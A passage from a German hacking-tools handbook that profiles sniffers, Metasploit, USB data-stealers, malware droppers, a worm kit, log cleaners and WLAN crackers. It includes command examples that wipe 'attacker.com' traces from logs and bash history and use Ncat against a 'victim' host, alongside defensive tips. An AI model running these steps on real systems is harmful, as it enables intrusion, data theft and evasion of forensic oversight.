Datenverkehr\n8.9\nWireshark\nAnbieter\nwww.wireshark.org\nPreis\n-\nBetriebssystem(e)\nWindows, Linux, UNIX und andere\nSprachen\nEnglisch\nKategorie(n)\nSniffer / Network Protocol Analyzer\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 15 MB\nSchnittstellen Ja, Portable verf\u00fcgbar\nUsability\nInstallation\nKnow-how\nGUI\nx\nCMD\nBen\u00f6tigt f\u00fcr Windows: WinPcap; AirPcap, CACE Pilot (optional)\n90\nKapitel 8 \u2013 Sniffer: Die Schn\u00fcffler im Netzwerk\nWireshark (der Nachfolger von Ethereal) ist ein Packet-Sniffer, der Netzwerkprotokolle \u2013 vorzugsweise TCP/IP \u2013 analysiert und die mitgeh\u00f6rten Datenpakete bzw. Frames zwecks Auswertung in diversen Ausgabeformaten zur Verf\u00fcgung stellt. \u00dcber unterschiedliche Filtertechniken k\u00f6nnen die ziemlich umfangreichen Rohdaten entsprechend reduziert werden. Der Bildschirm ist dreiteilig: Im ersten Fenster sieht man die Paketliste mit Absender und Empf\u00e4nger, im mittleren die Paketdetails mit Layerinformationen, MAC-Adressen etc. und im dritten die hexadezimale Paketanzeige. Ein Paketsniffer ist nicht per se ein Angriffswerkzeug, sondern dient vorzugsweise der detaillierten Fehlersuche in Netzwerken, z. B. nach Performanceverlusten im Netz, sucht nach doppelten Hostnamen oder doppelten MAC-Adressen. F\u00fcr Netzwerkangreifer ist das Tool sehr interessant, da viele Daten weiterhin unverschl\u00fcsselt \u00fcbertragen werden, unter anderem auch Login-Daten, Passw\u00f6rter, Inhalte von E-Mails etc. In geswitchten Netzen, in denen die Rechner nicht \u00fcber Hubs verbunden sind, ist die Reichweite von Paketsniffern aus technischen Gr\u00fcnden limitiert, da hier auf dem System des Angreifers nur die Datenpakete ankommen, die f\u00fcr alle User oder ihn speziell gedacht sind. Hier empfiehlt sich der zus\u00e4tzliche Einsatz von SwitchSniffer. Die Abwehrm\u00f6glichkeiten gegen Paketsniffer sind begrenzt. Wenn der Angriff gut gemacht ist, bleibt er in der Regel unentdeckt.\nBild 8.9: Gesniffte Datenstr\u00f6me in Wireshark\n8.10\nAbwehr \u2013 generelle Tipps\nGegen Netzwerksniffer ist kein Kraut gewachsen. Ihr Einsatz, der auf das Abfangen von Benutzerkennungen, Passw\u00f6rtern und weiteren vertraulichen Inhalten gerichtet ist, bleibt meist unbemerkt. Auf der anderen Seite sind Sniffer durchaus kein Werkzeug f\u00fcr\n8.10 Abwehr \u2013 generelle Tipps\n91\nSkript-Kiddies, da doch etliches Netzwerk-Know-how inkl. Verst\u00e4ndnis von Protokollen, Filtertechniken etc. erforderlich ist. Missbrauch kann man lediglich durch die Verwendung starker Kryptografie und einer sicheren Netzwerktopologie eind\u00e4mmen. Hat man einen Rechner im Verdacht, einen Sniffer zu beheimaten, kann man testen, inwieweit dort der Promiscuous-Mode eingebunden ist, der das Netzwerk-Interface in den entsprechenden \u00bbSniffer Mode\u00ab schaltet.\n93\n9\nSonstige Hackertools\nHier stellen wir Ihnen weitere \u00bbschmutzige Hackertricks\u00ab vor, damit Sie eine ungef\u00e4hre Ahnung gewinnen, mit welchen Angriffsarten und -methoden Sie sonst noch rechnen m\u00fcssen. Beim Ausprobieren ist gr\u00f6\u00dfte Vorsicht angeraten, da die Gefahr besteht, dass Sie Ihr System nachhaltig besch\u00e4digen. Wenn Ihnen ein selbst generierter Wurm in die freie Wildbahn entweichen sollte, haben Sie noch gr\u00f6\u00dfere Probleme am Hals, denn damit k\u00f6nnen Sie sehr viele Internet-User sch\u00e4digen und m\u00fcssen sich gegebenenfalls auch strafrechtlich zur Verantwortung ziehen lassen. Trotz allem scheint es uns aber wichtig, Ihnen eine funktionst\u00fcchtige Kette aufzuzeigen, wie andere es schaffen, Ihr System zu infiltrieren und bestehende Schutzmechanismen auszuhebeln.\n9.1\nMetasploit Framework (MSF)\nAnbieter\nhttp://www.metasploit.com/ framework\nPreis\n-\nBetriebssystem(e) Linux/UNIX, Mac OS X, Windows Sprachen\nEnglisch\nKategorie(n)\nExploit/Payload-Suite\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 50 MB\nNein / Ja\nUsability\nInstallation / Kompilation\nx\nCMD\nx\nSchnittstellen Perl\nKnow-how\nDas Metasploit Framework ist eine m\u00e4chtige, mittlerweile auf der Programmiersprache Ruby basierende Entwicklungs- und Testumgebung f\u00fcr diverse Exploits, Payloads, Opcodes und Shellcodes. Metasploit Framework stellt drei Oberfl\u00e4chen bereit und kann im interaktiven ConsoleMode (msfconsole), als zu automatisierender Console-Mode (msfcli) oder als Webinterface (msfweb) gestartet werden (msfweb wird ab Version 3.3 jedoch offiziell nicht weiter unterst\u00fctzt). Das Framework kann durch externe Add-ons in verschiedenen Sprachen erweitert werden.\n94\nKapitel 9 \u2013 Sonstige Hackertools\nDer Start des interaktiven Console-Mode mit msfconsole bringt folgendes Ergebnis:\nroot@discordia:~# msfconsole 888 888 d8b888 888 888 Y8P888 888 888 888 88888b.d88b. .d88b. 888888 8888b. .d8888b 88888b. 888 .d88b. 888888888 888 \"888 \"88bd8P Y8b888 \"88b88K 888 \"88b888d88\"\"88b888888 888 888 88888888888888 .d888888\"Y8888b.888 888888888 888888888 888 888 888Y8b. Y88b. 888 888 X88888 d88P888Y88..88P888Y88b. 888 888 888 \"Y8888 \"Y888\"Y888888 88888P'88888P\" 888 \"Y88P\" 888 \"Y888 888 888 888\n=[ + -- --=[ + -- --=[ =[\nmetasploit v3.3.4-dev [core:3.3 api:1.0] 535 exploits \u2013 254 auxiliary 198 payloads \u2013 23 encoders \u2013 8 nops svn r8854 updated today (2010.03.19)\nmsf >\nBild 9.1: Metasploit im Konsolenmodus\n9.2\nUSBDUMPER 2\nAnbieter\nhttp://sugoistanley.wordpress. Preis com/2007/08/06/hacking-tools2007/\nBetriebssystem(e) Windows 2000, Win XP, Win 2003, Win Vista, Win 7\nSprachen\nKategorie(n)\nSpionagetool\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 200 KB\nUsability\nInstallation\nNein Know-how\n-\nGUI\nCMD x\nSchnittstellen\nNach der v\u00f6llig unauff\u00e4lligen Installation (ohne Fenster etc.) auf einem Zielsystem werden in der Folge alle Daten von angeschlossenen USB-Sticks unbemerkt auf den Zielrechner \u00fcbertragen. Damit ist das Tool sehr gut f\u00fcr \u00f6ffentliche oder exponiert aufgestellte PCs geeignet, um private oder sonstige Daten zu speichern. Sobald der USBStick eingesetzt wird, beginnt die Daten\u00fcbertragung, wobei f\u00fcr jeden Tag ein entsprechender Ordner auf dem Zielsystem erstellt wird. Man muss allerdings aufpassen, da auch eine am USB-Port angeschlossene Festplatte gedumpt wird und der Zielrechner\n9.3 USB Switchblade / 7zBlade\n95\ndann schnell ans Ende seiner Speicherkapazit\u00e4t kommen kann. In der neuen Version k\u00f6nnen zus\u00e4tzlich Makros in Office-Dokumente importiert werden.\nBild 9.2: Datensammler am USB-Port\n9.3\nUSB Switchblade / 7zBlade\nAnbieter\nhttp://wiki.hak5.org17\nPreis\n-\nBetriebssystem(e) Windows 2000, Win XP, Win 2003, Sprachen Win Vista, Win 7 Kategorie(n)\nSpionagetool\nGr\u00f6\u00dfe\n< 1 MB\nUsability\nOberfl\u00e4che Installation\nNein Know-how\nGUI\nCMD x\nSchnittstellen\nW\u00e4hrend Switchblade f\u00fcr U3-Sticks entwickelt wurde, ist die 7zBlade-Variante f\u00fcr die klassischen USB-Sticks gedacht. Die Funktionsweise ist recht tricky: Beim Einstecken des Sticks in einen Host startet im Hintergrund ein VBS-Skript, das die Zieldateien auf die 17\nDie Seite ist noch w\u00e4hrend der \u00dcberarbeitung unseres Buches aus dem Netz verschwunden. Switchblade kann derzeit noch auf www.raymond.cc/blog/archives/2007/11/23/hack-u3-usb-smart-drive-to-becomeultimate-hack-tool/ heruntergeladen werden.\n96\nKapitel 9 \u2013 Sonstige Hackertools\nHostplatte kopiert, den Payload aus einem verschl\u00fcsselten 7z-Archiv entpackt, ausf\u00fchrt, die gesammelten Daten wieder verschl\u00fcsselt packt und die Ernte dann auf den Stick zur\u00fcckkopiert. Anschlie\u00dfend werden alle Spuren auf dem Zielrechner gel\u00f6scht.\nBild 9.3: Ausbeute \u2013 Daten vom fremden Rechner\n9.4\nNet Tools\nAnbieter\nhttp://users.pandora.be/ahmadi\nPreis\n-\nBetriebssystem(e) Win2000, WinXP, Win2003, Win NT 4.0\nSprachen\nEnglisch, Chinesisch\nKategorie(n)\nToolkit\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 26 MB\nUsability\nInstallation\nJa Know-how\nGUI\nSchnittstellen\nx\nCMD\nBen\u00f6tigt .NET Framework\nDer gr\u00f6\u00dfte Vorteil f\u00fcr erfahrene und weniger erfahrene Anwender: Unter einer einheitlichen Oberfl\u00e4che finden sich Hunderte von mehr oder minder brauchbaren Angriffswerkzeugen, darunter mehrere Portscanner, Nmap (GUI und CMD), Netzwerksniffer, LAN-Monitore, Flooder, Spoofer, Passwortcracker etc. Also mit einem Wort: der ideale Experimentierkasten f\u00fcr angehende Forscher. Allerdings sollte der weniger erfahrene Attacker durchaus wissen, dass einige Tools den Rand zur Legalit\u00e4t \u00fcberschreiten, z. B. wird kein Netzadmin begeistert sein, den Start einer DoS-Attacke mit einem HTTPFlood auf seine Seite zu erleben \u2013 mal ganz abgesehen davon, dass man den Angriffs-\n9.5 Troll Downloader\n97\nursprung sehr einfach zur\u00fcckverfolgen kann. \u00c4hnliches gilt f\u00fcr den Einsatz eines MassAuto-Mailers.\nBild 9.4: Alles, was man zum Hacken eines Netzwerks braucht\n9.5\nTroll Downloader\nAnbieter\nwww.evileyesoftware.com\nPreis\nBetriebssystem(e)\nWin200, Win2003, WinXP\nSprachen\nEnglisch\nKategorie(n)\nWeb Downloader\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 300 KB\nUsability\nInstallation\nx\nCMD -\nNein Schnittstellen Know-how\nEin schmutziger kleiner Geselle: Wird er auf einem Zielrechner ausgef\u00fchrt (und ist das Opfer nicht durch eine neuere Firewall gesch\u00fctzt), l\u00e4dt das Programm andere Programme (z. B. Keylogger, RATs etc.) nach und installiert sie auch gleich. Anschlie\u00dfend putzt sich das Programm selbst von der Platte, um die Spurensuche zu erschweren. In unserem Test funktionierte es gro\u00dfartig \u2013 allerdings wird der Server durch g\u00e4ngige Antivirentools erkannt, und auch die Firewall l\u00e4sst es nur durch manuellen Eingriff passieren. Der Download nebst Installation der heruntergeladenen Malware erfolgte allerdings unbemerkt im Hintergrund.\n98\nKapitel 9 \u2013 Sonstige Hackertools\nBild 9.5: Generieren eines Downloaders (Servermodul)\n9.6\nCzybik Gen Creation Kit\nAnbieter\nhttp://98.15.254.95/\nPreis\n-\nBetriebssystem(e)\nWin200, Win2003, WinXP\nSprachen\nEnglisch\nKategorie(n)\nWurmbaukasten\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 500 KB\nNein Schnittstellen\nUsability\nInstallation\nKnow-how\nx\nCMD -\nSchon etwas angejahrte Version eines Wurmbaukastens, der aber das Prinzip sehr gut veranschaulicht. Das Bedienungsprinzip ist simpel: Man klickt die Funktionen an, die der Wurm haben soll, inklusive gew\u00fcnschter Verbreitungswege und Payload (Schadensfunktionen). Der Output in Form eines Visual Basic-Skripts kann jetzt an das ahnungslose Opfer verteilt werden.\n9.7 WMF-Maker\n99\nBild 9.6: Czybik Gen Creation Kit erstellt W\u00fcrmer auf Knopfdruck\n9.7\nWMF-Maker\nAnbieter\nhttp://vx.netlux.org/\nPreis\n-\nBetriebssystem(e)\nWin200, Win2003, WinXP\nSprachen\nEnglisch\nKategorie(n)\nExploit\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 500 KB\nUsability\nInstallation\n-\nCMD x\nNein Schnittstellen Know-how\nDas Programm wird \u00fcber die Batchdatei wmf-maker.exe nte.exe (der Payload / die Schadfracht) gestartet und generiert dann die Datei evil.wmf, die umbenannt und entsprechend auf Webseiten eingebaut werden kann.\n100\nKapitel 9 \u2013 Sonstige Hackertools\nBild 9.7: WMF-Exploit automatisiert\n9.8\nfEvicol\nAnbieter\nhttp://98.15.254.95/\nPreis\nBetriebssystem(e)\nWin200, Win2003, WinXP\nSprachen\nEnglisch\nKategorie(n)\nJoiner / Binder\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 50 KB\nUsability\nInstallation\nx\nCMD -\nNein Schnittstellen Know-how\nEin typischer und noch dazu sehr kompakter, etwas \u00e4lterer Vertreter seiner Art. Er erlaubt es, Bilddateien mit ausf\u00fchrbaren Programmdateien zu verkn\u00fcpfen. Andere Binder k\u00f6nnen auch zwei Programme (z. B. eine Bilddatei und eine ausf\u00fchrbare Datei) so verbinden, dass im Vordergrund ein n\u00fctzliches Programm wie z. B. ein Bildschirmschoner geladen und im Hintergrund \u2013 vom Anwender unbemerkt \u2013 die eigentliche Schadensroutine gestartet wird.\n9.9 0x333shadow\n101\nBild 9.8: fEvicol verbirgt das Schadprogramm in einer Bilddatei.\n9.9\n0x333shadow\nAnbieter / Entwickler\nhttp://packetstormsecurity.nl\nPreis\n-\nBetriebssystem(e)\nLinux/UNIX, IRIX, FreeBSD,\nSprachen\nEnglisch\nSolaris Kategorie(n)\nLogfile-Cleaner\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 2 MB\nNein / Ja\nUsability\nInstallation / Kompilation\nGUI\nCMD x\nSchnittstellen\nKnow-how\n0x333shadow ist ein Logfile-Cleaner, mit dem sich verr\u00e4terische Eintr\u00e4ge in diversen Logfiles eines (Linux-/UNIX-)Systems entfernen lassen. 0x333shadow behandelt nicht nur Logfiles auf Textbasis, sondern auch bin\u00e4re Dateien wie utmpx, wtmp, wtmpx und lastlog. Mit 0x333shadow lassen sich auch zeitgesteuerte Reinigungen durchf\u00fchren, z. B. 60 Sekunden nach der Abmeldung vom zu s\u00e4ubernden Rechner. Ein Start des Logfile-Cleaners mit folgenden Parametern: \u2022\n-a (clean all default dirs (recursive scan) you can use even \u2013m)\n\u2022\n-i (string by search, choose it with sense ;))\nbringt folgendes Ergebnis (aus \u00dcbersichtsgr\u00fcnden leicht gek\u00fcrzt):\n102\nKapitel 9 \u2013 Sonstige Hackertools\ndiscordia:~# ./0x333shadow -a -i attacker.com [*] [*] [*] [*] [*] [*] [*] [*] [*] [*] [*] [*] [*] [*]\nsyslogd killed! Cleaning /var/log/btmp removed 0/0 Cleaning /var/log/exim4/mainlog removed 0/60 Cleaning /var/log/exim4/mainlog.1 removed 0/96 Cleaning /var/log/news/news.crit removed 0/0 Cleaning /var/log/news/news.err removed 0/0 Cleaning /var/log/news/news.notice removed 0/0 Cleaning /var/log/syslog removed 0/63 Cleaning /var/log/auth.log removed 0/281 Cleaning /var/log/debian-installer/messages removed 0/938 Cleaning /var/log/debian-installer/partman removed 0/3961 Cleaning /var/log/debian-installer/syslog removed 0/1788 Cleaning /var/log/debian-installer/cdebconf/questions.dat removed 0/1912 Cleaning /var/log/debian-installer/cdebconf/templates.dat removed 0/38497\n[*] cleaning extra logs: [*] Cleaning /var/run/utmp removed 0/12 [*] error reading file /var/adm/wtmp or touching /var/adm/wtmp.tmp skipping. [*] error reading file /usr/adm/wtmp or touching /usr/adm/wtmp.tmp skipping. [*] error reading file /etc/wtmp or touching /etc/wtmp.tmp skipping. [*] Cleaning /var/log/wtmp removed 1/242 [*] error reading file /var/adm/utmpx or touching /var/adm/utmpx.tmp skipping. [*] Cleaning /var/log/debug removed 0/538 [*] founded /var/log/messages in /etc/syslog.conf if isn't empty log will be cleaned. [*] Cleaning /var/log/messages removed 0/1928 [*] founded /dev/xconsole in /etc/syslog.conf if isn't empty log will be cleaned.\nBild 9.9: 0x333shadow reinigt Logfiles von verr\u00e4terischen Spuren\n9.10\nLogcleaner-NG\nAnbieter /\nPreis\n-\nBetriebssystem(e) Linux/UNIX, NetBSD, OpenBSD, FreeBSD\nSprachen\nEnglisch\nKategorie(n)\nLogfile-Cleaner\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 2 MB\nNein / Ja\nUsability\nEntwickler\nwww.packetstormsecurity.org/ UNIX/penetration/log-wipers\nInstallation / Kompilation\nCMD\nSchnittstellen\nKnow-how\nx\n9.10 Logcleaner-NG\n103\nLogcleaner-NG ist ein weiterer Logfile-Cleaner, mit dem sich verr\u00e4terische Eintr\u00e4ge in diversen Logfiles eines (Linux-/UNIX-)Systems entfernen lassen. Logcleaner-NG bearbeitet eine Vielzahl verschiedener Formate, wie beispielsweise textbasierte (syslog) und \u00bbnormale\u00ab Logfiles (wtmp, utmp, lastlog, accounting logs), aber auch spezielle Logfiles wie samba, snort.alert, prelude und mod_security. Logcleaner-NG erm\u00f6glicht die Vergabe von Zeitstempeln, liest die Konfiguration des SYSLOG ein, bietet die M\u00f6glichkeit, eigene Logfiles zu verschl\u00fcsseln und beherrscht einen interaktiven Modus. Zus\u00e4tzlich erschwert Logcleaner-NG durch das restlose L\u00f6schen (Wiping) von Daten die nachtr\u00e4gliche Forensik eines kompromittierten Rechners. Der Aufruf von Logcleaner-NG mit folgenden Parametern: \u2022\n-A\nclean Default logfiles\n\u2022\n-s\nstring\nbringt folgendes Ergebnis:\ndiscordia:~# ./logcleaner-ng -A -s attacker.com -----------------------------------------------------------------Logcleaner-NG *** * -----------------------------------------------------------------[STATUS] clearing /var/run/utmp [STATUS] clearing /var/log/wtmp [STATUS] clearing /var/log/lastlog [STATUS] clearing /var/log/samba/log.smbd [STATUS] clearing /var/log/samba/log.nmbd [STATUS] clearing /root/.bash_history [STATUS] clearing /var/log/exim4/mainlog [STATUS] Ignoring compressed [1] file: /var/log/exim4/mainlog.2.gz [STATUS] Ignoring compressed [1] file: /var/log/exim4/mainlog.3.gz [STATUS] clearing /var/log/exim4/mainlog.1 [STATUS] clearing /var/log/auth.log (...) [STATUS] clearing /var/log/syslog.0 [STATUS] clearing /var/log/vmware-tools-guestd [STATUS] Ignoring compressed [1] file: /var/log/syslog.3.gz [STATUS] clearing /var/log/syslog [STATUS] Ignoring compressed [1] file: /var/log/syslog.1.gz\nBild 9.10: Logcleaner-NG bei der Entfernung verr\u00e4terischer Spuren aus diversen Logfiles\n104\nKapitel 9 \u2013 Sonstige Hackertools\n9.11\nNakedBind\nAnbieter\nhttp://98.15.254.95/\nPreis\n-\nBetriebssystem(e)\nWin200, Win2003, WinXP\nSprachen\nEnglisch\nKategorie(n)\nJoiner / Binder / Trojan Dropper\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 100 KB\nNein Schnittstellen\nUsability\nInstallation\nKnow-how\nx\nCMD -\nDas Programm bietet fast alles, was man sich w\u00fcnscht: Es bindet mehrere Dateien zusammen, verschl\u00fcsselt das Endprodukt und erlaubt es, unterschiedliche Startkonfigurationen festzulegen.\nBild 9.11: Der Trojan Dropper NakedBind l\u00e4sst in puncto Ausstattung kaum W\u00fcnsche offen.\n9.12 Ncat (Nmap-Suite)\n9.12\n105\nNcat (Nmap-Suite)\nAnbieter / Entwickler\nhttp://nmap.org/ncat\nPreis\nBetriebssystem(e)\nLinux/UNIX, Mac OS X, BSD, Sprachen\nEnglisch\nSolaris, Windows Kategorie(n)\nNetzwerktool\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 2 MB\nNein / Ja\nUsability\nInstallation / Kompilation\nGUI\nCMD\nx\nSchnittstellen\nKnow-how\nNcat, der inoffizielle Nachfolger des popul\u00e4ren Netcat, ist ein \u00fcberaus m\u00e4chtiges Netzwerkprogramm, welches den Transport von Daten von der Standardein- und -ausgabe \u00fcber TCP- oder UDP-Netzwerkverbindungen erm\u00f6glicht. Ncat kann ausgehende und eingehende Verbindungen zu oder von jedem Port senden \u2013 mittlerweile auch SSL-verschl\u00fcsselt \u2013, besitzt volle DNS-Forward-Lookup- und Reverse-Lookup-\u00dcberpr\u00fcfung, kann jeden lokalen Quellport und jede lokal konfigurierte Netzwerkquelladresse verwenden, beherrscht bewegliches Quellrouting und besitzt zus\u00e4tzlich einen praktischen Broker-Mode, der beispielsweise einen einfachen Chat-Server erm\u00f6glicht. Der Versand einer Datei vom Quell-PC auf einen Ziel-PC \u00fcber Port 10023/TCP ist mit folgenden Parametern m\u00f6glich: \u2022\n-l, --listen (bind and listen for incoming connections)\n\u2022\n-v, --verbose (set verbosity level (can be used up to 3 times))\n\u2022\n-p, --source-port specify source port to use)\nEingabe auf dem Opfer-PC (Empf\u00e4nger):\nvictim:~# ncat -l -v -p 10023 >datei Ncat: Version 5.20 ( http://nmap.org/ncat ) Ncat: Listening on 0.0.0.0:10023 Ncat: Connection from attacker.org. victim:~#\nBild 9.12: Ncat empf\u00e4ngt eine Datei\nEingabe auf den Quell-PC (Versender):\ndiscordia:~# ncat -v victim.org 10023 media/cdrom dev etc\nBild 9.15: Ncat \u00f6ffnet die Hintert\u00fcr des Zielrechners\n9.13\nGNU MAC Changer (macchanger)\nAnbieter\nwww.alobbs.com/macchanger\nPreis\n-\nBetriebssystem(e) Linux/UNIX\nSprachen\nEnglisch\nKategorie(n)\nTool zum Ver\u00e4ndern der MAC-Adresse\nOberfl\u00e4che GUI\nGr\u00f6\u00dfe\n< 2 MB\nUsability\nInstallation / Kompilation\nJa\nCMD x\nSchnittstellen Know-how\n9.14 Abwehr \u2013 generelle Tipps\n107\nDurch den GNU MAC Changer lassen sich MAC-Adressen von Netzwerkkarten modifizieren. Bei Wardrivern (Leuten, die systematisch nach offenen WLANs suchen) geh\u00f6rt der GNU MAC Changer zur Standardausr\u00fcstung, erm\u00f6glicht das Tool doch eine Verschleierung der tats\u00e4chlichen MAC-Adresse der WLAN-Karte und tr\u00e4gt dazu bei, m\u00f6glichst wenig verwertbare Spuren beim Opfer zu hinterlassen. Der Einsatz des GNU MAC Changer, hier demonstriert an der willk\u00fcrlichen Vergabe einer MAC-Adresse am Netzwerkinterface eth1: \u2022\n-r (set fully random MAC)\nbringt folgendes Ergebnis:\nroot@discordia:~# macchanger -r eth1 Current MAC: 00:40:96:43:f1:fc [wireless] (Cisco/Aironet 4800/340) Faked MAC: 70:9d:e8:5a:98:86 (unknown) root@discordia:~#\nBild 9.16: GNU MAC Changer bei der Vergabe einer willk\u00fcrlichen MAC-Adresse\n9.14\nAbwehr \u2013 generelle Tipps\nEinige der hier vorgestellten Tools werden von den g\u00e4ngigen AV-Systemen als Sch\u00e4dlinge erkannt und unmittelbar bek\u00e4mpft. Etwas anders sieht die Sache mit den USBAngriffen durch USBDumper und 7zBlade sowie verwandten Tools aus. Betroffen sind sowohl Heim- als auch Firmennetzwerke. Die USB-Ports mit Kunstharz zu versiegeln, w\u00fcrde Abhilfe schaffen, aber die Usability der Workstations stark beeintr\u00e4chtigen (nat\u00fcrlich ginge das auch softwaretechnisch, indem einfach der USB-Treiber USBSTOR.SYS aus dem Windows-Verzeichnis gel\u00f6scht wird). Alternativ k\u00f6nnen auch verschiedene f\u00fcr den USB-Betrieb notwendige Dateien wie die %SystemRoot%\\ Inf\\Usbstor.pnf+Usbstor.inf \u00fcber einen \u00bbBerechtigung-verweigern-Eintrag\u00ab auf Dateiebene gesperrt werden. Flexibler, aber auch kostenaufwendiger ist der Einsatz von Programmen, die USB-Sticks und -Festplatten registrieren und den unzul\u00e4ssigen Gebrauch nicht freigegebener Ger\u00e4te einschr\u00e4nken, z. B. mit Tools wie DeviceLock (www.devicelock.com) oder itWatch (www.itwatch.de). Flankierend dazu muss nat\u00fcrlich das Booten via USB-Medien unterbunden werden. Im Privatbereich und bei geringer Sicherheitsbedrohung reicht es ggf. aus, die Autostartrampen zu blockieren, sodass ein verseuchter Stick nicht automatisch vom System aktiviert wird.\n109\n10 Wireless Hacking Die Beliebtheit von Wireless LAN ist ungebrochen \u2013 vor allem im privaten Umfeld. Daf\u00fcr sprechen nat\u00fcrlich vor allem Bequemlichkeitsgr\u00fcnde. Wer keine Lust hat, durch seine Wohnung Leitungen zu ziehen, und den Luxus liebt, mit dem mobilen Empfangsger\u00e4t \u00fcberall in Haus und Garten frei nach Lust und Laune surfen zu k\u00f6nnen, setzt auf WLAN. Obwohl es eine Vielzahl von Standards (IEEE 802.11a, IEEE 802.11b, IEEE 802.11g, IEEE 802.11h, IEEE 802.11n) und \u00dcbertragungsraten (54 bis 600 Mbps) gibt, hat das kabellose lokale Netzwerk ein grunds\u00e4tzliches Problem: Es ist leicht angreifbar und viele Hacker betreiben Wardriving, das Scannen von offenen und gesch\u00fctzten Funknetzen, als eine Art Sport. Als Schutzma\u00dfnahme wird vor allem Wi-Fi Protected Access (WPA / WPA2) eingesetzt, das mit AES-Verschl\u00fcsselung arbeitet und durch W\u00f6rterbuchattacken angegriffen werden kann. Teilweise findet sich jedoch immer noch das auf 40- oder 104-Bit-Schl\u00fcsseln beruhende und leicht zu knackende Wired Equivalent Privacy (WEP). Die hier vorgestellten Angriffstools arbeiten auf unterschiedlichen Ebenen: Im ersten Schritt wird der Angreifer nach Access-Points suchen, die als \u00bbdrahtloser Hub\u00ab alle empfangenen Signale in das jeweilige Netzwerk weiterleiten. Im zweiten Schritt wird er die Art der WLAN-Absicherung (Open Node = ungesichertes Netzwerk; Closed Node = geschlossenes WLAN-Netzwerk, WEP-Node = verschl\u00fcsseltes Netzwerk) ermitteln und versuchen, sich in den Netzwerkverkehr einzuklinken. Das Mith\u00f6ren bzw. Mitschneiden des Datenverkehrs (Sniffen) funktioniert \u00e4hnlich wie in drahtgebundenen Netzen, und im Prinzip k\u00f6nnen auch die gleichen Tools daf\u00fcr eingesetzt werden. Bei mit WEP verschl\u00fcsselten Netzwerken braucht man, um sich aktiven Zugang zu verschaffen, 50.000 bis 1.500.000 Pakete f\u00fcr die Schl\u00fcsselgenerierung. Fallen diese ben\u00f6tigten Datenpakete nicht an, da z. B. in dem beobachteten WLAN kaum Traffic aufl\u00e4uft, lassen sich die Pakete, die zur Errechnung des verwendeten WEP-Schl\u00fcssels notwendig sind, auch k\u00fcnstlich generieren. Abgerundet werden die Angriffstools durch Programme, mit denen sich MAC- und IP-Adresse f\u00e4lschen (spoofen) lassen, um quasi \u00bblegitimer\u00ab Mitbenutzer des Netzes zu werden.\n110\nKapitel 10 \u2013 Wireless Hacking\n10.1\nKismet-Newcore\nAnbieter www.kismetwireless.net Betriebssystem(e) Linux/UNIX, OpenBSD, FreeBSD, NetBSD, Mac OS X, Windows (Cygwin) Kategorie(n) WLAN-Sniffer Gr\u00f6\u00dfe < 10 MB Installation / Kompilation\nUsability\nPreis Sprachen\nEnglisch\nOberfl\u00e4che GUI x CMD Nein / Schnittstellen Ethereal/Tcpdump, Ja Aircrack-NG, Airsnort, GPSD, GpsDrive, Festival, Flite, PluginManagement Know-how\nDas Programm Kismet-Newcore ist ein leistungsf\u00e4higer WLAN-Sniffer, der Funknetzwerke durch das passive Sammeln von Informationen identifiziert und selbst vor versteckten Funknetzen (hidden (E)SSID) nicht haltmacht. Kismet-Newcore ist der Freund eines jeden Funkforschers, da das Programm extrem leistungsf\u00e4hig ist, sich durch zahlreiche Plugins erweitern l\u00e4sst (u. a. durch DECT) und viele Optionen bietet: So k\u00f6nnen durch Kismet-Newcore entdeckte Funknetze z. B. nicht nur durch akustische Signale bemerkbar gemacht, sondern sogar \u00bbvorgelesen\u00ab werden (inklusive SSID/Name, Kanal und Status der WLAN-Verschl\u00fcsselung). Befindet sich ein GPS-Empf\u00e4nger am Computer, zeichnet Kismet zus\u00e4tzlich die Koordinaten entdeckter Funknetze auf. Die Funknetze lassen sich sp\u00e4ter mit Zusatzprogrammen kartografieren. Der Aufruf von Kismet-Newcore auf einer Konsole bringt u. a. folgendes Ergebnis: discordia:~# kismet\n10.2 Aircrack-NG (Aircrack-NG-Suite)\n111\nBild 10.1: Kismet beim Sichten von Funknetzen\n10.2\nAircrack-NG (Aircrack-NG-Suite)\nAnbieter\nwww.aircrack-ng.org\nPreis\n-\nBetriebssystem(e)\nLinux/UNIX, Windows, Mac OS X\nSprachen\nEnglisch\nKategorie(n)\nWEP und WPA-PSK/WPA2Cracker\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 2 MB\nNein / Schnittstellen Ja\nAirodump-NG, Kismet-Newcore\nUsability\nKnow-how\nInstallation / Kompilation\nCMD x\nAircrack-NG ist eine Toolsammlung f\u00fcr Wireless-Hacking, die Sniffing- und InjectionTools sowie einen WEP- und WPA/WPA2-Cracker f\u00fcr Wireless-Netzwerke beinhaltet. Die Aircrack-NG-Suite enth\u00e4lt u. a. die Programme aircrack-ng zur Brechung von WEPund WPA-PSK-Netzen, airodump-ng zur Suche und zum Mitschneiden von WLANVerkehr und aireplay-ng zur Injektion von WLAN-Paketen. Aircrack-NG kann bei einer ausreichenden Anzahl mitgeschnittener WLAN-Pakete bzw. schwacher WEP IVs (Initialisierungsvektoren) den verwendeten WEP-Schl\u00fcssel errechnen. Je nach L\u00e4nge des WEP-Schl\u00fcssels ben\u00f6tigt das Programm f\u00fcr 64-Bit-Schl\u00fcssel durchschnittlich 100.000 bis 250.000 IVs, bei 128-Bit-Schl\u00fcsseln sogar durchschnittlich 500.000 bis 1.000.000 gesammelter IVs.\n112\nKapitel 10 \u2013 Wireless Hacking\nBild 10.2: Aircrack-NG beim Errechnen eines WEP-Schl\u00fcssels\n10.3\nAireplay-NG (Aircrack-NG-Suite)\nAnbieter\nwww.aircrack-ng.org\nPreis\n-\nBetriebssystem(e)\nLinux/UNIX, Windows, Mac OS X\nSprachen\nEnglisch\nKategorie(n)\nWLAN-Frame-Injection-Tool\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 2 MB\nInstallation / Kompilation\nNein / 